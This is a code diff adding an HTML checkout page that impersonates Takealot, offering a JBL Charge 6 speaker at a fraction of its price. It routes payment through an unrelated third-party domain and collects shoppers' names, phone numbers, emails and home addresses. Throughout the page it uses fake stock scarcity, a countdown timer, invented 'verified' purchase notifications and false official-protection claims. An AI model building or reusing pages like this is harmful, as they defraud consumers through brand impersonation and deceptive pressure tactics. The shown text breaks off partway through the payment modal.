@@ -1,0 +1,1617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>Takealot Secure Checkout & Delivery Address | takealot.com</title>
+
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1307124204288756');
+    fbq('init', '1098439149600898');
+    fbq('init', '4179716432354886');
+    fbq('track', 'PageView');
+    fbq('track', 'InitiateCheckout', {
+      value: 297.00,
+      currency: 'ZAR',
+      content_name: 'Takealot Black November Deal',
+      content_type: 'product'
+    });
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1307124204288756&ev=PageView&noscript=1"/>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1098439149600898&ev=PageView&noscript=1"/>
+  </noscript>
+  <!-- End Meta Pixel Code -->
+
+  <!-- UTMify Scripts -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-subids
+    data-utmify-ignore-iframe
+    async
+    defer
+  ></script>
+  <script>
+    window.pixelId = "68c92beba8283e33b6647fe4";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <!-- End UTMify Scripts -->
+
+  <!-- Official CreaPay & Secure Direct Inline Payment Scripts -->
+  <script src="https://pay.africagrabpoint.com/embed.js"></script>
+  <script src="https://js.paystack.co/v2/inline.js"></script>
+
+  <style>
+    :root {
+      --blue: #0b6ecb;
+      --blue-dark: #074783;
+      --green: #178a3b;
+      --green-dark: #126e2f;
+      --orange: #f59e0b;
+      --orange-dark: #d97706;
+      --danger: #e11d48;
+      --text-main: #1e293b;
+      --text-muted: #64748b;
+      --border: #e2e8f0;
+      --bg-page: #f1f5f9;
+      --bg-card: #ffffff;
+      --radius: 12px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg-page);
+      color: var(--text-main);
+      -webkit-font-smoothing: antialiased;
+      line-height: 1.5;
+    }
+
+    /* TOP HEADER */
+    .checkout-header {
+      background: var(--blue);
+      color: #fff;
+      height: 60px;
+      padding: 0 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+    }
+    .brand-link {
+      color: #fff;
+      text-decoration: none;
+      font-size: 21px;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .brand-link span { color: #ffe100; }
+    .header-security {
+      font-size: 11px;
+      font-weight: 700;
+      background: rgba(255,255,255,0.16);
+      border: 1px solid rgba(255,255,255,0.25);
+      padding: 5px 10px;
+      border-radius: 999px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+    }
+
+    /* STEP PROGRESS BAR */
+    .checkout-stepper {
+      background: #fff;
+      border-bottom: 1px solid var(--border);
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      font-size: 12px;
+      font-weight: 700;
+    }
+    .step-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--text-muted);
+    }
+    .step-item.active {
+      color: var(--blue);
+    }
+    .step-num {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: #e2e8f0;
+      color: #64748b;
+      display: grid;
+      place-items: center;
+      font-size: 11px;
+      font-weight: 800;
+    }
+    .step-item.active .step-num {
+      background: var(--blue);
+      color: #fff;
+    }
+    .step-arrow { color: #cbd5e1; }
+
+    /* WRAPPER */
+    .checkout-wrap {
+      max-width: 620px;
+      margin: 14px auto 70px;
+      padding: 0 14px;
+    }
+
+    /* URGENCY & STOCK LIMIT BANNER */
+    .urgency-banner {
+      background: linear-gradient(135deg, #fff7ed 0%, #ffedd5 100%);
+      border: 1.5px solid #fdba74;
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      margin-bottom: 14px;
+      box-shadow: 0 2px 6px rgba(245, 158, 11, 0.08);
+    }
+    .urgency-top-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 6px;
+    }
+    .urgency-timer-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: #dc2626;
+      color: #fff;
+      font-weight: 900;
+      font-size: 11px;
+      padding: 3px 9px;
+      border-radius: 999px;
+      letter-spacing: 0.3px;
+      animation: pulseAlert 2s infinite ease-in-out;
+    }
+    .urgency-stock-text {
+      font-size: 12px;
+      font-weight: 800;
+      color: #9a3412;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .urgency-progress-wrap {
+      width: 100%;
+      height: 6px;
+      background: #fed7aa;
+      border-radius: 999px;
+      overflow: hidden;
+      margin-top: 6px;
+    }
+    .urgency-progress-bar {
+      width: 91%;
+      height: 100%;
+      background: linear-gradient(90deg, #f97316, #dc2626);
+      border-radius: 999px;
+      transition: width 1s ease;
+    }
+    .urgency-limit-text {
+      font-size: 11px;
+      color: #c2410c;
+      font-weight: 700;
+      margin-top: 6px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    @keyframes pulseAlert {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.88; transform: scale(1.02); }
+    }
+
+    /* CARD STYLES */
+    .checkout-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 18px 16px;
+      margin-bottom: 14px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+    }
+    .card-title {
+      font-size: 15px;
+      font-weight: 800;
+      color: #0f172a;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 14px;
+    }
+
+    /* PRODUCT SUMMARY MINI */
+    .order-item {
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+    }
+    .order-thumb {
+      width: 80px;
+      height: 80px;
+      border-radius: 8px;
+      object-fit: contain;
+      background: #fff;
+      border: 1px solid var(--border);
+      padding: 4px;
+      flex-shrink: 0;
+    }
+    .order-details { flex: 1; min-width: 0; }
+    .order-badge {
+      display: inline-block;
+      background: #fee2e2;
+      color: #b91c1c;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 2px 7px;
+      border-radius: 4px;
+      margin-bottom: 4px;
+      text-transform: uppercase;
+    }
+    .order-name {
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 1.35;
+      color: #0f172a;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+    }
+    .order-pricing {
+      display: flex;
+      align-items: baseline;
+      gap: 8px;
+      margin-top: 6px;
+    }
+    .price-current {
+      font-size: 18px;
+      font-weight: 900;
+      color: var(--blue);
+    }
+    .price-original {
+      font-size: 12px;
+      color: #94a3b8;
+      text-decoration: line-through;
+    }
+    .delivery-free {
+      font-size: 11px;
+      color: var(--green);
+      font-weight: 700;
+      margin-left: auto;
+    }
+
+    /* QUANTITY SELECTOR SECTION */
+    .qty-section {
+      margin-top: 16px;
+      padding-top: 14px;
+      border-top: 1.5px dashed var(--border);
+    }
+    .qty-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    .qty-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: #0f172a;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .qty-max-badge {
+      font-size: 10px;
+      font-weight: 800;
+      background: #fef3c7;
+      color: #b45309;
+      padding: 3px 8px;
+      border-radius: 999px;
+      border: 1px solid #fde68a;
+    }
+
+    /* QUANTITY STEPPER (PLUS / MINUS) */
+    .qty-stepper-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      background: #f8fafc;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      padding: 8px 12px;
+      margin-bottom: 10px;
+    }
+    .qty-stepper-label {
+      font-size: 12px;
+      font-weight: 700;
+      color: #475569;
+    }
+    .qty-stepper {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .qty-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 8px;
+      border: 1.5px solid #cbd5e1;
+      background: #fff;
+      color: #0f172a;
+      font-size: 18px;
+      font-weight: 900;
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      transition: all 0.15s ease;
+      user-select: none;
+    }
+    .qty-btn:hover:not(:disabled) {
+      background: var(--blue);
+      border-color: var(--blue);
+      color: #fff;
+    }
+    .qty-btn:disabled {
+      opacity: 0.35;
+      cursor: not-allowed;
+      border-color: #e2e8f0;
+      background: #f1f5f9;
+    }
+    .qty-value {
+      font-size: 16px;
+      font-weight: 900;
+      color: #0f172a;
+      min-width: 28px;
+      text-align: center;
+    }
+
+    /* QUANTITY CHIPS (1, 2, 3 UNITS) */
+    .qty-options-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin-top: 8px;
+    }
+    .qty-card {
+      border: 1.5px solid var(--border);
+      background: #fff;
+      border-radius: 10px;
+      padding: 10px 8px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      min-height: 72px;
+    }
+    .qty-card:hover {
+      border-color: #93c5fd;
+    }
+    .qty-card.active {
+      border-color: var(--blue);
+      background: #eff6ff;
+      box-shadow: 0 0 0 1.5px var(--blue);
+    }
+    .qty-card-ribbon {
+      position: absolute;
+      top: -8px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--orange);
+      color: #fff;
+      font-size: 9px;
+      font-weight: 900;
+      padding: 2px 6px;
+      border-radius: 999px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+      white-space: nowrap;
+    }
+    .qty-card.active .qty-card-ribbon {
+      background: var(--blue);
+    }
+    .qty-card-units {
+      font-size: 13px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-top: 2px;
+    }
+    .qty-card-price {
+      font-size: 14px;
+      font-weight: 900;
+      color: var(--blue);
+      margin-top: 2px;
+    }
+    .qty-card-save {
+      font-size: 10px;
+      color: var(--green);
+      font-weight: 700;
+      margin-top: 2px;
+    }
+
+    /* FORM STYLES */
+    .form-group {
+      margin-bottom: 12px;
+    }
+    .form-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 700;
+      color: #334155;
+      margin-bottom: 5px;
+    }
+    .form-input, .form-select {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      border: 1.5px solid var(--border);
+      border-radius: 8px;
+      font-size: 14px;
+      color: #0f172a;
+      background: #fff;
+      outline: none;
+      transition: border-color 0.15s ease;
+    }
+    .form-input:focus, .form-select:focus {
+      border-color: var(--blue);
+      box-shadow: 0 0 0 3px rgba(11, 110, 203, 0.12);
+    }
+    .form-row {
+      display: flex;
+      gap: 10px;
+    }
+    .form-row .form-group {
+      flex: 1;
+    }
+
+    /* PAYMENT METHOD CARD (REFINED CLEAN DESIGN) */
+    .payment-option-card {
+      border: 1.5px solid var(--blue);
+      background: #f8fbff;
+      border-radius: 10px;
+      padding: 14px 14px;
+      margin-bottom: 12px;
+    }
+    .payment-option-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .payment-radio-indicator {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 5px solid var(--blue);
+      background: #fff;
+      flex-shrink: 0;
+    }
+    .payment-title-group {
+      flex: 1;
+    }
+    .payment-main-title {
+      font-size: 13.5px;
+      font-weight: 800;
+      color: #0f172a;
+    }
+    .payment-sub-title {
+      font-size: 11px;
+      color: var(--text-muted);
+    }
+    .payment-badge-pill {
+      font-size: 10px;
+      font-weight: 800;
+      color: var(--green);
+      background: #dcfce7;
+      padding: 3px 8px;
+      border-radius: 999px;
+      border: 1px solid #bbf7d0;
+    }
+
+    /* PAYMENT ICONS STRIP */
+    .payment-badges-row {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 8px;
+      padding-top: 10px;
+      border-top: 1px solid #e0ecfb;
+      margin-top: 8px;
+    }
+    .pay-logo-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      height: 28px;
+      background: #fff;
+      border: 1px solid #cbd5e1;
+      border-radius: 5px;
+      padding: 0 7px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.04);
+    }
+    .capitec-badge {
+      background: #003b64;
+      color: #fff;
+      font-weight: 900;
+      font-size: 10.5px;
+      padding: 0 8px;
+      height: 28px;
+      border-radius: 5px;
+      display: inline-flex;
+      align-items: center;
+      gap: 3px;
+      letter-spacing: 0.2px;
+    }
+    .eft-badge {
+      background: #0284c7;
+      color: #fff;
+      font-weight: 800;
+      font-size: 10.5px;
+      padding: 0 8px;
+      height: 28px;
+      border-radius: 5px;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      letter-spacing: 0.2px;
+    }
+
+    /* TOTAL BAR */
+    .price-breakdown {
+      border-top: 1px dashed var(--border);
+      padding-top: 10px;
+      margin-top: 12px;
+      font-size: 12.5px;
+      color: var(--text-muted);
+    }
+    .price-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 6px;
+    }
+    .price-row.total {
+      font-size: 16px;
+      font-weight: 900;
+      color: #0f172a;
+      border-top: 1.5px solid var(--border);
+      padding-top: 10px;
+      margin-top: 10px;
+    }
+
+    /* SUBMIT BUTTON */
+    .btn-submit {
+      width: 100%;
+      height: 54px;
+      background: var(--green);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 4px 14px rgba(23, 138, 59, 0.38);
+      transition: background 0.15s ease, transform 0.05s ease;
+    }
+    .btn-submit:hover {
+      background: var(--green-dark);
+    }
+    .btn-submit:active {
+      transform: scale(0.99);
+    }
+
+    .footer-guarantee {
+      margin-top: 14px;
+      text-align: center;
+      font-size: 11px;
+      color: var(--text-muted);
+      line-height: 1.45;
+    }
+
+    /* LIVE SOCIAL PROOF PURCHASE TOAST */
+    .sales-toast-container {
+      position: fixed;
+      bottom: 18px;
+      left: 18px;
+      z-index: 9999;
+      pointer-events: none;
+      max-width: 340px;
+    }
+    .sales-toast {
+      pointer-events: auto;
+      background: #ffffff;
+      border: 1px solid #cbd5e1;
+      border-radius: 12px;
+      padding: 10px 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transform: translateY(120%);
+      opacity: 0;
+      transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.4s ease;
+    }
+    .sales-toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .toast-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #e0f2fe;
+      color: var(--blue);
+      font-weight: 800;
+      font-size: 14px;
+      display: grid;
+      place-items: center;
+      flex-shrink: 0;
+      border: 1.5px solid #bae6fd;
+    }
+    .toast-content {
+      flex: 1;
+      min-width: 0;
+    }
+    .toast-title {
+      font-size: 12px;
+      font-weight: 800;
+      color: #0f172a;
+      line-height: 1.3;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .toast-desc {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--blue);
+      margin-top: 1px;
+    }
+    .toast-meta {
+      font-size: 10px;
+      color: #15803d;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      margin-top: 2px;
+    }
+    .toast-close {
+      color: #94a3b8;
+      cursor: pointer;
+      font-size: 16px;
+      line-height: 1;
+      padding: 2px 4px;
+      border: none;
+      background: transparent;
+    }
+
+    /* MODAL OVERLAY */
+    .creapay-modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      z-index: 99999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+    }
+    .creapay-modal-container {
+      background: #ffffff;
+      border: 2px solid var(--blue);
+      border-radius: 16px;
+      width: 100%;
+      max-width: 480px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      max-height: 92vh;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+      animation: modalFadeIn 0.25s ease-out;
+    }
+    .creapay-modal-header {
+      background: linear-gradient(90deg, var(--blue), var(--blue-dark));
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: #fff;
+    }
+    .modal-close-icon {
+      background: rgba(0,0,0,0.25);
+      color: #fff;
+      border: none;
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      font-size: 20px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s ease;
+    }
+    .modal-close-icon:hover {
+      background: rgba(0,0,0,0.45);
+    }
+    .creapay-iframe-wrapper {
+      flex: 1;
+      min-height: 520px;
+      background: #ffffff;
+    }
+    .creapay-iframe-wrapper iframe {
+      width: 100%;
+      height: 520px;
+      border: 0;
+    }
+    @keyframes modalFadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @media (max-width: 480px) {
+      .sales-toast-container {
+        left: 12px;
+        right: 12px;
+        bottom: 12px;
+        max-width: none;
+      }
+      .qty-options-grid {
+        gap: 6px;
+      }
+      .qty-card {
+        padding: 8px 4px;
+      }
+      .qty-card-units {
+        font-size: 12px;
+      }
+      .qty-card-price {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="checkout-header">
+    <a href="jbl_charge_6.html" id="brandLogoLink" class="brand-link" title="Return to Product">
+      <span style="font-size:22px; line-height:1; margin-right:2px; font-weight:300;">‹</span> takealot<span>.com</span>
+    </a>
+    <div class="header-security">
+      🔒 256-BIT SECURE
+    </div>
+  </header>
+
+  <!-- STEP PROGRESS BAR -->
+  <div class="checkout-stepper">
+    <div class="step-item" id="stepCart" style="cursor:pointer;" title="Back to product details">
+      <span class="step-num">✓</span> Cart
+    </div>
+    <span class="step-arrow">›</span>
+    <div class="step-item active">
+      <span class="step-num">2</span> Delivery & Pay
+    </div>
+    <span class="step-arrow">›</span>
+    <div class="step-item">
+      <span class="step-num">3</span> Confirmation
+    </div>
+  </div>
+
+  <main class="checkout-wrap">
+
+    <!-- URGENCY & STOCK LIMIT BANNER -->
+    <div class="urgency-banner">
+      <div class="urgency-top-row">
+        <div class="urgency-stock-text">
+          <span>🔥</span> Only <span id="stockCount" style="color:#dc2626; font-size:13px;">4</span> Units Left in Stock
+        </div>
+        <div class="urgency-timer-pill">
+          <span>⚡ Reserved:</span> <span id="timerDisplay">09:48</span>
+        </div>
+      </div>
+      <div class="urgency-progress-wrap">
+        <div class="urgency-progress-bar" id="progressBar"></div>
+      </div>
+      <div class="urgency-limit-text">
+        <span>⚠️</span> <b>Strict Limit:</b> Max 3 units per customer due to Black November clearance regulations.
+      </div>
+    </div>
+
+    <form id="addressForm">
+
+      <!-- ORDER SUMMARY & QUANTITY SELECTION CARD -->
+      <div class="checkout-card">
+        <div class="card-title">
+          <span>📦 Order Summary</span>
+        </div>
+        <div class="order-item">
+          <img id="productImg" src="images/charge6_black.jpg" alt="Selected Product" class="order-thumb" />
+          <div class="order-details">
+            <span class="order-badge">Black November Clearance</span>
+            <div id="productTitle" class="order-name">
+              JBL Charge 6 Waterproof Portable Bluetooth Speaker (Matte Black)
+            </div>
+            <div class="order-pricing">
+              <span id="priceDisplay" class="price-current">R 297</span>
+              <span id="oldPriceDisplay" class="price-original">R 2,499</span>
+              <span class="delivery-free">FREE COURIER</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- DYNAMIC QUANTITY SELECTOR (1, 2, OR 3 UNITS) -->
+        <div class="qty-section">
+          <div class="qty-header">
+            <div class="qty-title">
+              <span>Select Quantity</span>
+              <span style="font-size:11px; color:var(--text-muted); font-weight:normal;">(Units)</span>
+            </div>
+            <span class="qty-max-badge">Maximum 3 Units</span>
+          </div>
+
+          <!-- Stepper: Minus, Number, Plus -->
+          <div class="qty-stepper-wrap">
+            <span class="qty-stepper-label">Number of speakers:</span>
+            <div class="qty-stepper">
+              <button type="button" class="qty-btn" id="btnQtyMinus" onclick="changeQty(-1)" aria-label="Decrease quantity">−</button>
+              <span class="qty-value" id="qtyDisplay">1</span>
+              <button type="button" class="qty-btn" id="btnQtyPlus" onclick="changeQty(1)" aria-label="Increase quantity">+</button>
+            </div>
+          </div>
+
+          <!-- Quick Select Option Cards (1, 2, 3) -->
+          <div class="qty-options-grid">
+            <div class="qty-card active" id="cardQty1" onclick="selectQty(1)">
+              <div class="qty-card-units">1 Unit</div>
+              <div class="qty-card-price" id="cardPrice1">R 297</div>
+              <div class="qty-card-save" id="cardSave1">Save R 2,202</div>
+            </div>
+
+            <div class="qty-card" id="cardQty2" onclick="selectQty(2)">
+              <span class="qty-card-ribbon">🔥 Popular</span>
+              <div class="qty-card-units">2 Units</div>
+              <div class="qty-card-price" id="cardPrice2">R 594</div>
+              <div class="qty-card-save" id="cardSave2">Save R 4,404</div>
+            </div>
+
+            <div class="qty-card" id="cardQty3" onclick="selectQty(3)">
+              <span class="qty-card-ribbon" style="background:#dc2626;">⚡ Max Limit</span>
+              <div class="qty-card-units">3 Units</div>
+              <div class="qty-card-price" id="cardPrice3">R 891</div>
+              <div class="qty-card-save" id="cardSave3">Save R 6,606</div>
+            </div>
+          </div>
+
+          <div id="qtyLimitAlert" style="display:none; font-size:11px; color:#b91c1c; font-weight:700; margin-top:8px; text-align:center; background:#fee2e2; padding:5px 8px; border-radius:6px;">
+            ⚠️ Maximum allowance reached: 3 units per household limit.
+          </div>
+        </div>
+      </div>
+
+      <!-- DELIVERY ADDRESS CARD -->
+      <div class="checkout-card">
+        <div class="card-title">
+          <span>📍 Delivery Address (South Africa)</span>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Recipient Full Name *</label>
+          <input type="text" id="fullName" class="form-input" placeholder="e.g. Sipho Dlamini" required />
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Phone Number (For Courier SMS) *</label>
+            <input type="tel" id="phone" class="form-input" placeholder="082 123 4567" required />
+          </div>
+          <div class="form-group">
+            <label class="form-label">Email Address *</label>
+            <input type="email" id="email" class="form-input" placeholder="sipho@gmail.com" required />
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Street Address & House/Complex No. *</label>
+          <input type="text" id="streetAddress" class="form-input" placeholder="e.g. 14 Long Street, Apt 4B" required />
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Suburb *</label>
+            <input type="text" id="suburb" class="form-input" placeholder="e.g. Rosebank" required />
+          </div>
+          <div class="form-group">
+            <label class="form-label">City *</label>
+            <input type="text" id="city" class="form-input" placeholder="e.g. Johannesburg" required />
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Province *</label>
+          <select id="province" class="form-select" required>
+            <option value="Gauteng" selected>Gauteng</option>
+            <option value="Western Cape">Western Cape</option>
+            <option value="KwaZulu-Natal">KwaZulu-Natal</option>
+            <option value="Eastern Cape">Eastern Cape</option>
+            <option value="Free State">Free State</option>
+            <option value="Limpopo">Limpopo</option>
+            <option value="Mpumalanga">Mpumalanga</option>
+            <option value="North West">North West</option>
+            <option value="Northern Cape">Northern Cape</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- PAYMENT METHOD CARD (CLEAN SOUTH AFRICAN BANKING BADGES) -->
+      <div class="checkout-card">
+        <div class="card-title">
+          <span>💳 Secure Payment</span>
+        </div>
+
+        <div class="payment-option-card">
+          <div class="payment-option-header">
+            <div class="payment-radio-indicator"></div>
+            <div class="payment-title-group">
+              <div class="payment-main-title">Instant Card & Bank EFT (Debit, Credit & Capitec Pay)</div>
+              <div class="payment-sub-title">Capitec, FNB, Standard Bank, Nedbank, Absa & TymeBank</div>
+            </div>
+            <span class="payment-badge-pill">Instant Clearance</span>
+          </div>
+
+          <!-- Official Payment Logos Strip: Visa, Mastercard, Capitec, Instant EFT -->
+          <div class="payment-badges-row">
+            <!-- Visa SVG -->
+            <div class="pay-logo-badge" title="Visa">
+              <svg width="34" height="20" viewBox="0 0 36 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="36" height="24" rx="4" fill="#00579F"/>
+                <path d="M14.8 16.5H12.6L14 7.5H16.2L14.8 16.5ZM21.9 7.7C21.4 7.5 20.6 7.3 19.6 7.3C17.1 7.3 15.3 8.6 15.3 10.5C15.3 11.9 16.6 12.7 17.5 13.1C18.5 13.6 18.8 13.9 18.8 14.4C18.8 15.1 18 15.4 17.2 15.4C16.1 15.4 15.5 15.2 14.7 14.8L14.3 14.6L13.9 16.8C14.6 17.1 15.8 17.4 17.1 17.4C19.8 17.4 21.5 16.1 21.5 14.1C21.5 12.9 20.7 11.9 19 11.1C18.1 10.6 17.6 10.3 17.6 9.8C17.6 9.3 18.2 8.8 19.2 8.8C20 8.8 20.8 9 21.3 9.2L21.5 9.3L21.9 7.7ZM27.8 7.5H26.1C25.5 7.5 25 7.7 24.8 8.3L21.2 16.5H23.5L24 15.2H26.7L27 16.5H29L27.8 7.5ZM24.6 13.4L25.7 10.1C25.7 10.1 26 9.2 26.1 8.8L26.3 10.1L26.9 13.4H24.6ZM11.1 7.5L8.9 13.7L8.6 12.4C8.2 10.9 6.8 9.2 5.2 8.4L7.2 16.5H9.6L13.3 7.5H11.1Z" fill="white"/>
+              </svg>
+            </div>
+
+            <!-- Mastercard SVG -->
+            <div class="pay-logo-badge" title="Mastercard">
+              <svg width="34" height="20" viewBox="0 0 36 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="36" height="24" rx="4" fill="#141414"/>
+                <circle cx="14" cy="12" r="7" fill="#EB001B"/>
+                <circle cx="22" cy="12" r="7" fill="#F79E1B"/>
+                <path d="M18 7.4A7 7 0 0 1 20.6 12A7 7 0 0 1 18 16.6A7 7 0 0 1 15.4 12A7 7 0 0 1 18 7.4Z" fill="#FF5F00"/>
+              </svg>
+            </div>
+
+            <!-- Capitec Pay Badge -->
+            <div class="capitec-badge" title="Capitec Pay">
+              <span style="color:#00a3e0; font-size:12px;">●</span> Capitec<span style="color:#f26522;">Pay</span>
+            </div>
+
+            <!-- Instant EFT Badge -->
+            <div class="eft-badge" title="Instant EFT">
+              ⚡ Instant EFT
+            </div>
+          </div>
+        </div>
+
+        <div class="price-breakdown">
+          <div class="price-row">
+            <span id="labelSubtotal">Item Subtotal (1 unit)</span>
+            <span id="calcSubtotal">R 297.00</span>
+          </div>
+          <div class="price-row">
+            <span>Express Courier Doorstep Delivery</span>
+            <span style="color:var(--green);font-weight:700;">FREE</span>
+          </div>
+          <div class="price-row total">
+            <span>Total Amount Payable</span>
+            <span id="calcTotal" style="color:var(--blue);">R 297.00</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- SUBMIT BUTTON -->
+      <button type="submit" id="submitBtn" class="btn-submit">
+        <span>PROCEED TO SECURE PAYMENT (R 297.00) →</span>
+      </button>
+
+      <div class="footer-guarantee">
+        🛡️ <b>Takealot Official Buyer Protection:</b> 100% Secure Checkout verified by South African Interbank switch. 30-day money-back satisfaction guarantee upon delivery.
+      </div>
+
+    </form>
+  </main>
+
+  <!-- LIVE SOCIAL PROOF PURCHASE TOAST NOTIFICATION -->
+  <div class="sales-toast-container">
+    <div class="sales-toast" id="salesToast">
+      <div class="toast-avatar" id="toastAvatar">BM</div>
+      <div class="toast-content">
+        <div class="toast-title" id="toastTitle">Bongani M. from Johannesburg</div>
+        <div class="toast-desc" id="toastDesc">Just purchased 2x JBL Charge 6</div>
+        <div class="toast-meta">
+          <span>✓</span> <span id="toastTime">18 seconds ago</span> • <span>Verified Order</span>
+        </div>
+      </div>
+      <button type="button" class="toast-close" onclick="dismissToast()" aria-label="Close notification">&times;</button>
+    </div>
+  </div>
+
+  <!-- SECURE INLINE POPUP MODAL -->
+  <div class="creapay-modal-overlay" id="creaPayModal" style="display:none;" onclick="handleOverlayClick(event)">
+    <div class="creapay-modal-container" onclick="event.stopPropagation()">
+      <div class="creapay-modal-header">
+        <div>
+          <div style="font-size:13px;font-weight:800;">Takealot Official Secure Checkout</div>
+          <div style="font-size:10px;opacity:0.85;">256-Bit TLS Encrypted • South Africa Secure Switch</div>
+        </div>
+        <button type="button" class="modal-close-icon" onclick="closeCreaPayModal()">&times;</button>
+      </div>
+      <div id="modalIframeLoader" style="padding:18px;text-align:center;font-size:12px;color:var(--blue);font-weight:700;">
+        Connecting to Secure Banking Switch...
+      </div>
